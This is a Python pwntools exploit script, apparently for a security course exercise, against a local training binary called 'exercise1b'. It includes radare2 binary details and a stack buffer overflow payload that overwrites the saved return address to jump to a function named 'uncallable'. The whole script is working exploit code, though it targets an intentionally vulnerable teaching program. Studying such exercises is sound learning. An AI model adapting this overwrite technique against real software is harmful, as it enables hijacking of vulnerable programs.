#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
#exe = 'handout/exercise1/exercise1b'
exe = './exercise1b'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
# Use static analysis to recover address, variables, memory allocation, etc.
'''
arch     x86
baddr    0x400000
binsz    15023
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
'''
'''
...
0x004011b6 24 sym.uncallable
0x004011ce 72 sym.check_authorization
0x00401216 120 main
0x00401216 120 sym.main
...
'''
# It's little endian, x86-64
# From static analysis, the address at which the method "uncallable" is stored is 0x004011b6
stack_part = 14 * b"AAAAAAAA" #fill the allocated stack (allocated in check_authorization); 14 * 8 bytes = 112 bytes
main_rbp_part = b"BBBBBBBB" #overwrite main's rbp value that is stored at beginning of check_authorization
ret_address = b"\xb6\x11\x40\x00\x00\x00\x00\x00" #overwrite return address (back into main) with address of "uncallable"
r.sendline(stack_part + main_rbp_part + ret_address)
#print(r.recvline())
print(r.recvall(timeout=5))

